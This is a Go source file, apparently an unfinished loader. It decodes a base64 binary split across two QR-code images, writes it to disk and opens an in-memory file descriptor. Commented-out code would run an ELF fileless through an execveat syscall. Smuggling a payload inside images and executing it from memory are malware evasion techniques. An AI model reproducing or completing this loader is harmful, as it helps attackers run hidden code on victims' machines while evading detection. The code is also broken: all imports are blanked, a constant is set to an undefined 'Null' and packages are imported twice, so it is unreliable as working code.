package main

import (
	_"encoding/base64"
	_"fmt"
	_"image"
	_"image/png" // Import PNG decoder
	_"io/ioutil"
	_"os"
	_"fmt"
    _"io"
    _"os"
    _"unsafe"
    _"golang.org/x/sys/unix"
	_"github.com/makiuchi-d/gozxing"
	_"github.com/makiuchi-d/gozxing/qrcode"
)

// AT_EMPTY_PATH is the flag telling execveat to use the FD even if the path is "".
const AT_EMPTY_PATH = 0x1000

// Hardcode the path to the binary here
const helloWorldBinary = Null

// decodeQRCode decodes a QR code from an image file and returns the decoded text.
func decodeQRCode(filename string) (string, error) {
	// Open the file
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()

	// Decode the image
	img, _, err := image.Decode(file)
	if err != nil {
		return "", err
	}

	// Convert the image to a binary bitmap for decoding
	bmp, err := gozxing.NewBinaryBitmapFromImage(img)
	if err != nil {
		return "", err
	}

	// Create the QR code reader and decode the QR code
	qrReader := qrcode.NewQRCodeReader()
	result, err := qrReader.Decode(bmp, nil)
	if err != nil {
		return "", err
	}

	// Return the decoded text
	return result.GetText(), nil
}

func decodeshit() {
	// Decode the first QR code
	decodedPart1, err := decodeQRCode("basic_qrcode_part_1.png")
	if err != nil {
		fmt.Println("Error decoding QR code part 1:", err)
		return
	}
	fmt.Println("Decoded Part 1:", decodedPart1)

	// Decode the second QR code
	decodedPart2, err := decodeQRCode("basic_qrcode_part_2.png")
	if err != nil {
		fmt.Println("Error decoding QR code part 2:", err)
		return
	}
	fmt.Println("Decoded Part 2:", decodedPart2)



	// Combine both decoded parts (base64 encoded data)
	combinedBase64 := decodedPart1 + decodedPart2 

	// Decode the combined base64 string into binary data
	decodedBytes, err := base64.StdEncoding.DecodeString(combinedBase64)
	if err != nil {
		fmt.Println("Error decoding base64:", err)
		return
	}

	// Print first 100 bytes of the decoded binary data (for verification)
	fmt.Println("Decoded Binary Data (first 100 bytes):", decodedBytes[:100])

	// Write the decoded binary data to a file
	err = ioutil.WriteFile("output.bin", decodedBytes, 0644)
	if err != nil {
		fmt.Println("Error writing binary data to file:", err)
		return
	}

	// Confirm the binary data has been written
	fmt.Println("Binary data successfully written to 'output.bin'")
}






func main() {
	decodeshit()



    // 1. Read the ELF from disk
    // data, err := os.ReadFile(helloWorldBinary)
    // if err != nil {
    //     fmt.Fprintf(os.Stderr, "Failed to read file %s: %v\n", helloWorldBinary, err)
    //     os.Exit(1)
    // }

    // 2. memfd_create: an in-memory file descriptor
    fd, err := unix.MemfdCreate("memexec", 0)
    if err != nil {
        fmt.Fprintf(os.Stderr, "MemfdCreate error: %v\n", err)
        os.Exit(1)
    }

    // // 3. Write ELF data into the memfd
    // n, err := unix.Write(fd, data)
    // if err != nil || n != len(data) {
    //     fmt.Fprintf(os.Stderr, "Write error: %v (wrote %d of %d)\n", err, n, len(data))
    //     _ = unix.Close(fd)
    //     os.Exit(1)
    // }

    // // Rewind to start
    // if off, err := unix.Seek(fd, 0, io.SeekStart); err != nil || off != 0 {
    //     fmt.Fprintf(os.Stderr, "Seek error: %v\n", err)
    //     _ = unix.Close(fd)
    //     os.Exit(1)
    // }

    // // 4. execveat(fd, "", argv, envp, AT_EMPTY_PATH)
    // argv := []string{"hello_from_memfd"} // argv[0] can be anything you like
    // envp := os.Environ()

    // // We never return on success
    // err = execveatEmptyPath(fd, argv, envp)
    // if err != nil {
    //     fmt.Fprintf(os.Stderr, "execveat error: %v\n", err)
    //     _ = unix.Close(fd)
    //     os.Exit(1)
    // }

    // // not reached if execveat succeeds
    // _ = unix.Close(fd)
}

// execveatEmptyPath calls execveat(fd, "", argv, envp, AT_EMPTY_PATH).
// func execveatEmptyPath(fd int, argv []string, envp []string) error {
//     // Convert Go strings -> null-terminated C strings
//     argvPtrs := make([]*byte, len(argv)+1)
//     for i, s := range argv {
//         cstr, err := unix.BytePtrFromString(s)
//         if err != nil {
//             return fmt.Errorf("invalid argv string %q: %w", s, err)
//         }
//         argvPtrs[i] = cstr
//     }

//     envpPtrs := make([]*byte, len(envp)+1)
//     for i, e := range envp {
//         cstr, err := unix.BytePtrFromString(e)
//         if err != nil {
//             return fmt.Errorf("invalid env string %q: %w", e, err)
//         }
//         envpPtrs[i] = cstr
//     }

//     // On x86_64, SYS_EXECVEAT is typically 322. On ARM64, 281, etc.
//     // The "golang.org/x/sys/unix" package usually defines unix.SYS_EXECVEAT for you.
//     const SYS_EXECVEAT = unix.SYS_EXECVEAT

//     // A pointer to an empty C-string ("")
//     emptyStringPtr, _ := unix.BytePtrFromString("")

//     // int execveat(int dirfd, const char *pathname,
//     //              char *const argv[], char *const envp[],
//     //              int flags);
//     r1, _, e := unix.Syscall6(
//         SYS_EXECVEAT,
//         uintptr(fd),
//         uintptr(unsafe.Pointer(emptyStringPtr)),
//         uintptr(unsafe.Pointer(&argvPtrs[0])),
//         uintptr(unsafe.Pointer(&envpPtrs[0])),
//         uintptr(AT_EMPTY_PATH),
//         0,
//     )
//     if e != 0 {
//         return e
//     }
//     if r1 != 0 {
//         return fmt.Errorf("execveat returned %d unexpectedly", r1)
//     }
//     // execveat does not return on success
//     return nil
// }


